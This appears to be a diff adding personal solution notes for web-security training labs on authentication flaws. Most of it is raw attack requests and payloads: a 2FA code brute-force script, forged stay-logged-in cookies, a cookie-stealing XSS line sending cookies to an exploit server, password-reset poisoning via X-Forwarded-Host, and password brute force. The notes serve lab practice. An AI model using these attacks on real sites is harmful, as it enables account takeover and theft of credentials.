@@ -220,3 +220,472 @@ password=pepper&username=activestat
 ---
  
 pepper
+
+5) Lab: 2FA broken logic
+
+POST /login HTTP/2
+Host: 0ac100b0044404e18135358200bf007b.web-security-academy.net
+Cookie: verify=wiener; session=bMj0d69BN7NIsMfqZ7K4e04ZEBQ5vrWM
+Content-Length: 30
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ac100b0044404e18135358200bf007b.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ac100b0044404e18135358200bf007b.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=wiener&password=peter
+
+---
+
+Turbo intruder
+
+---
+
+POST /login2 HTTP/2
+Host: 0ac100b0044404e18135358200bf007b.web-security-academy.net
+Cookie: verify=carlos; session=hi5PfALXLwbHBwkGSRB5Yl4eXAh5Wp4S
+Content-Length: 13
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ac100b0044404e18135358200bf007b.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ac100b0044404e18135358200bf007b.web-security-academy.net/login2
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+mfa-code=%s
+
+---
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, engine=Engine.BURP2)
+
+    # try every 4-digit code: 0000-9999
+    for i in range(10000):
+        engine.queue(target.req, '%04d' % i)
+
+def handleResponse(req, interesting):
+
+    # wrong code  -> 200 (login page with error)
+    # correct code -> 302 (redirect to /my-account)
+    if req.status == 302:
+        table.add(req)
+
+---
+
+POST /login2 HTTP/2
+Host: 0ac100b0044404e18135358200bf007b.web-security-academy.net
+Cookie: verify=carlos; session=hi5PfALXLwbHBwkGSRB5Yl4eXAh5Wp4S
+Content-Length: 13
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ac100b0044404e18135358200bf007b.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ac100b0044404e18135358200bf007b.web-security-academy.net/login2
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+mfa-code=0926
+
+6) Lab: Brute-forcing a stay-logged-in cookie
+
+POST /login HTTP/2
+Host: 0ace005304fcf35280aff822006900fd.web-security-academy.net
+Cookie: session=2MXGpSW5N8RwSwtNIlFthxF1N8zvfIk5
+Content-Length: 48
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ace005304fcf35280aff822006900fd.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ace005304fcf35280aff822006900fd.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=wiener&password=peter&stay-logged-in=on
+
+->
+
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
+Set-Cookie: session=Z6tMYwyuw1ee3SXHilmaaylcuM14BCXz; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+---
+
+d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+-> BASE64
+
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+->
+
+MD5("peter") = 51dc30ddc473d43a6011e9ebba6ca770
+
+or https://md5decrypt.net/en/
+
+---
+
+LOGOUT!!! AND LOGIN WITH INTRUDER!
+
+Payload processing rules:
+- Hash: MD5
+- Add Prefix: carlos:
+- Base64-encode
+
+---
+
+<@base64>carlos:<@md5>austin</@md5></@base64>
+
+->
+
+Y2FybG9zOjIyOTk3OWZjZTUxNzRjMTdkNDY0NWJmODc1MmRhZTFl
+
+---
+
+GET /my-account?id=carlos HTTP/2
+Host: 0a690084033320088199ad9900d900ea.web-security-academy.net
+Cookie: stay-logged-in=Y2FybG9zOjIyOTk3OWZjZTUxNzRjMTdkNDY0NWJmODc1MmRhZTFl; session=9niZ1tHe0HFr0TthWt4Akwafeo65CvO1
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://0a690084033320088199ad9900d900ea.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+7) Lab: Offline password cracking
+
+POST /login HTTP/2
+Host: 0a06001f044e92f8807adb0000a10068.web-security-academy.net
+Cookie: session=ZUGVOnkazxPrdfM9FwRXKJUKYRxuFgbu
+Content-Length: 48
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a06001f044e92f8807adb0000a10068.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a06001f044e92f8807adb0000a10068.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=wiener&password=peter&stay-logged-in=on
+
+->
+
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
+Set-Cookie: session=lwj4mN1gy1Nn1NwDslemkKYeBq7IZFIA; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+---
+
+d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+-> BASE64
+
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+-> 51dc30ddc473d43a6011e9ebba6ca770 -> MD5 -> https://md5decrypt.net/en/
+
+peter
+
+---
+
+Go to comments and use XSS attack
+
+->
+
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+->
+
+<script>document.location='//exploit-0ada00a7040992778003da1001c7003e.exploit-server.net/'+document.cookie</script>
+
+---
+
+Go to exploit server logs
+
+->
+
+10.0.4.146      2026-09-20 13:32:15 +0000 "GET /secret=RJQoY5RazfSxCkrzX8VTUQlb5gTHt5sF;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+
+->
+
+Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+
+->
+
+carlos:26323c16d5f4dabff3bb136f2460a943
+
+-> https://md5decrypt.net/en/ -> 26323c16d5f4dabff3bb136f2460a943
+
+onceuponatime
+
+8) Lab: Password reset broken logic
+
+Reset password by username
+
+-> 
+
+email
+
+->
+
+https://0a2000fb04317829801649a900c70077.web-security-academy.net/forgot-password?temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h
+
+---
+
+POST /forgot-password?temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h HTTP/2
+Host: 0a2000fb04317829801649a900c70077.web-security-academy.net
+Cookie: session=gB66wIxDQYjHAIOd0aV4411SRwSqrPOp
+Content-Length: 115
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a2000fb04317829801649a900c70077.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a2000fb04317829801649a900c70077.web-security-academy.net/forgot-password?temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h&username=wiener&new-password-1=test&new-password-2=test
+
+---
+
+POST /forgot-password?temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h HTTP/2
+Host: 0a2000fb04317829801649a900c70077.web-security-academy.net
+Cookie: session=gB66wIxDQYjHAIOd0aV4411SRwSqrPOp
+Content-Length: 115
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a2000fb04317829801649a900c70077.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a2000fb04317829801649a900c70077.web-security-academy.net/forgot-password?temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+temp-forgot-password-token=m8zrwuk3wtnn0qa3y1y0kdwsulp3qi1h&username=carlos&new-password-1=test&new-password-2=test
+
+---
+
+carlos
+test
+
+9) Lab: Password reset poisoning via middleware
+
+POST /forgot-password HTTP/2
+Host: 0af3009d0345f0d880df03ef00420072.web-security-academy.net
+Cookie: session=9CDrLUBej8UaRhGXCifNvLUIPPO9MECj
+Content-Length: 15
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0af3009d0345f0d880df03ef00420072.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af3009d0345f0d880df03ef00420072.web-security-academy.net/forgot-password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=wiener
+
+->
+
+https://0af3009d0345f0d880df03ef00420072.web-security-academy.net/forgot-password?temp-forgot-password-token=kq72l7dx5edjtwek88t2jtmgvxf89nd0
+
+---
+
+X-Forwarded-Host: exploit-0a5c00bf03d1f0308003024f01be00fe.exploit-server.net
+username=carlos
+
+---
+
+POST /forgot-password HTTP/2
+Host: 0af3009d0345f0d880df03ef00420072.web-security-academy.net
+Cookie: session=9CDrLUBej8UaRhGXCifNvLUIPPO9MECj
+Content-Length: 15
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0af3009d0345f0d880df03ef00420072.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af3009d0345f0d880df03ef00420072.web-security-academy.net/forgot-password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+X-Forwarded-Host: exploit-0a5c00bf03d1f0308003024f01be00fe.exploit-server.net
+
+username=carlos
+
+---
+
+10.0.3.240      2026-09-20 14:55:28 +0000 "GET /forgot-password?temp-forgot-password-token=ql6cwigafije7vqohbqdpwtsha5c6g7b HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+
+---
+
+https://0af3009d0345f0d880df03ef00420072.web-security-academy.net/forgot-password?temp-forgot-password-token=ql6cwigafije7vqohbqdpwtsha5c6g7b
+
+---
+
+carlos
+test
+
+10) Lab: Password brute-force via password change
+
+POST /my-account/change-password HTTP/2
+Host: 0a8f00c1047d28a080df71eb004400b8.web-security-academy.net
+Cookie: session=zgmtPVJRhWW2hk6IkntpjGYmrtg0DKlJ
+Content-Length: 78
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a8f00c1047d28a080df71eb004400b8.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a8f00c1047d28a080df71eb004400b8.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=wiener&current-password=peter&new-password-1=test&new-password-2=test
+
+---
+
+Go to intruder, set username - carlos, set DIFFERENT NEW passwords for error - "New passwords do not match"
+
+->
+
+POST /my-account/change-password HTTP/2
+Host: 0a8f00c1047d28a080df71eb004400b8.web-security-academy.net
+Cookie: session=gObWXEPop4jDyDM6LPVuoyfiHRRXFDoX
+Content-Length: 75
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0a8f00c1047d28a080df71eb004400b8.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a8f00c1047d28a080df71eb004400b8.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=carlos&current-password=test&new-password-1=500&new-password-2=123
+
+---
+
+carlos
+1qaz2wsx
